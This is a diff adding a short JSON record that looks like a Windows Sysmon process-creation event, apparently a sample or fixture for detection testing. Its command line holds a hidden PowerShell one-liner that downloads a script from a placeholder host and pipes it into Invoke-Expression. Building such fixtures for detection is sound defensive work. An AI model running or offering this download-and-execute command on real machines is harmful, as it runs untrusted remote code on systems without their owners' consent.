@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-09-03 12:00:00.000",
+  "ParentImage": "C:\\Windows\\explorer.exe",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -w hidden -c \"irm https://payload-delivery.invalid/cdn/patch.ps1 | iex\"",
+  "User": "VICTIM-PC\\analyst"
+}
